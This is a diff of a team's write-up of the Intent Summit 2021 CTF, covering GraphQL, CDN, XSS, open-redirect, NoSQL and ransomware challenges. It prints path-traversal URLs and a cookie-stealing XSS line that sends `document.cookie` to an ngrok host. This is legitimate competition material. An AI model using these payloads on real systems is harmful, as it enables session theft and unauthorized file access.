@@ -1,7 +1,6 @@
 ---
 title: "Intent Summit 2021 CTF"
 date: 2021-11-16T21:36:08+01:00 
-draft: true
 tags: ["pwn", "rev", "web", "intent", "bot"]
 author: havce
 description: A fun CTF where we came in eighth out of 90 teams! We focussed mainly on web and rev/pwn challenges. It was really fun!
@@ -76,11 +75,18 @@ Let's apply to this job with this resume. 🤭
 ```bash
 INTENT{zipfiles_are_awsome_for_pt}
 ```
+
 # GraphiCS
-### Description
+> What is your problem?
+How didn't you approve my beautiful innovative page on your "precious" CTF?!
+It's all done, maybe I can just add some graphics.
+
+**Description**
+
 The challenge presents a website that makes a single query to a GraphQL endpoint. We probably need to extract the flag from there.
 
-### Solution
+**Solution**
+
 Immediately tried introspection, but it was disabled. Luckily we can abuse the autocorrection feature and this tool: https://github.com/nikitastupin/clairvoyance/, using a decent word list will reveal that we can use this query to get the flag:
 
 ```json
@@ -88,7 +94,10 @@ Immediately tried introspection, but it was disabled. Luckily we can abuse the a
 ```
 
 # Etulosba
-### Description
+> Our spy managed to steal the source code for the Etulosba CDN. We need your help to get the flag from that server.
+
+**Description**
+
 We are provided with the source code of what supposedly is a CDN: 
 
 ```javascript
@@ -124,15 +133,21 @@ fs.writeFileSync(path.join("/tmp", process.env.FLAG_NAME), process.env.FLAG);
 server.listen(process.env.HTTP_PORT);
 ```
 
-### Solution
+**Solution**
+
 By quickly looking at the code we can see the usage of `path.join` and `path.resolve` with user input which can be quite dangerous. Indeed the two endpoints provide two vulnerabilities: we can first read the `flag.name` file by requesting `https://etulosba.chal.intentsummit.org/files/images/%2E%2E%2F%2E%2E%2Fflag%2Ename` and then query it's contents with `https://etulosba.chal.intentsummit.org/files/binary/%2Ftmp%2Fimaflagimaflag`
 
 
 # Darknet Club
-### Description
+> There is a new invite system for the most exclusive darknet websites.
+Can you help me get an in?
+
+**Description**
+
 The challenge let us register an account and then present us a simple profile page with the ability to ask the "admin" to review our profile. This looked like an XSS challenge.
 
-### Solution
+**Solution**
+
 First we checked all inputs to see whether they were sanitized and indeed the referral input wasn't. I quickly tried an XSS payload to steal the admin's cookies, but realized CSP was enabled and that we needed some other way. At that point I realized I could upload a profile picture, but that required a JPEG file which appeared to be checked for the magic bytes only. At this point the route was clear:
 
 1) Upload a "valid" JPEG file that's also a malicious JS script:
@@ -151,10 +166,14 @@ location.href="//xxxx-xx-xx-xx-xx.ngrok.io?cookies="+document.cookie;
 3) Request a review by the admin
 
 # Flag Vault
-### Description
+> We found a publicly accessible Flag Vault server. Can you find a way to steal the flag from the site admin?
+
+**Description**
+
 The challenge contains a simple login page that seems to never login and is not vulnerable to basic SQLi. JWT tokens also look same after a bit of fuzzing.
 
-### Solution
+**Solution**
+
 The report button suggests we probably need to send a malicious URL to the "admin". Seems easy, but it appears to check the domain of the URL to be the same of website the challenge is on. Upon visiting `/admin`, we are redirected to `/?redirect=/admin&error=INVALID_TOKEN` which probably means we will be redirect to the given URL upon successful login (something we cannot test). Checking the redirect login we can see it's not very safe:
 
 ```javascript
@@ -169,10 +188,14 @@ After receiving the token, which expires in 10 seconds, we can quickly login and
 
 
 # Mass Notes
-### Description
+> We know the flag is on the Mass Notes servers, can you get it for us?
+
+**Description**
+
 The app simply lets us create notes which are stored on a MongoDB server. I spent a lot of time investigating a possible MongoDB injection, but that wasn't it (sort of).
 
-### Solution
+**Solution**
+
 A common problem with MongoDB (and NoSQL) implementations is being able to override parameters set in the code with ones of our choice. We can override a couple, but most notably `avatar`. By messing with a bit, we can see that the avatar for our notes is not visible anymore and that an error is returned instead. `../../flag` appears to be a good avatar to get the flag!
 
 # Pattern Institute
@@ -290,11 +313,14 @@ INTENT{pl4y1n6_1n_7h3_54nd_15_d4n63r0u5}
 ```
 
 # Scadomware
-### Description
+> Someone hacked my OT network and dropped a ransomware! plz h3lp me recover this encrypted file!
+
+**Description**
+
 We are provided a sample of a ransomware and an encrypted file. Our task is to decrypt such file.
 
+**Solution**
 
-### Solution
 The executable main function is to enumerate files and encrypt them all. The encryption is done with AES/CBC the IV is fixed in the code and the key is the SHA1 of some string which is the concatenation of:
 
 - A generated static string `YouTakeTheRedPillYouStayInWonderlandAndIShowYouHowDeepTheRabbitHoleGoes`
@@ -406,11 +432,15 @@ int main() {
 
 
 # Electron
-### Description
+> Shoperfect now has a new bug bounty program to help mitigate bot activity on their website.
+> You need to buy premium items from Shoperfect, but you need to be fast.
+
+**Description**
+
 The challenge required to write a simple bot program to get the flag very quickly.
 
+**Solution**
 
-### Solution
 With a bit of reverse engineering of the `merge` function and the rude fingerprinting code, we can write such a script to get the flag:
 
 ```python
